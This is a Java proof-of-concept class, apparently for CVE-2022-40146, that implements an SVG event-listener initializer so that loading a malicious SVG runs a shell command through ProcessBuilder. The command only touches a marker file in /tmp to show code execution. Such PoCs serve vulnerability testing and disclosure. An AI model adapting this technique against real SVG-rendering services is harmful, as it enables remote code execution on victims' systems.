package com.poc;

import java.lang.ProcessBuilder;
import org.w3c.dom.svg.EventListenerInitializer;
import org.w3c.dom.svg.SVGDocument;

public class Poc implements EventListenerInitializer {

    public void initializeEventListeners(SVGDocument doc) {
        try{
            String[] in = {"touch","/tmp/CVE-2022-40146_Jar_RCE"};
            ProcessBuilder pb = new ProcessBuilder(in);
            Process p = pb.start();
        }
        catch (Exception ex){
            ex.printStackTrace();
        }
    }
}
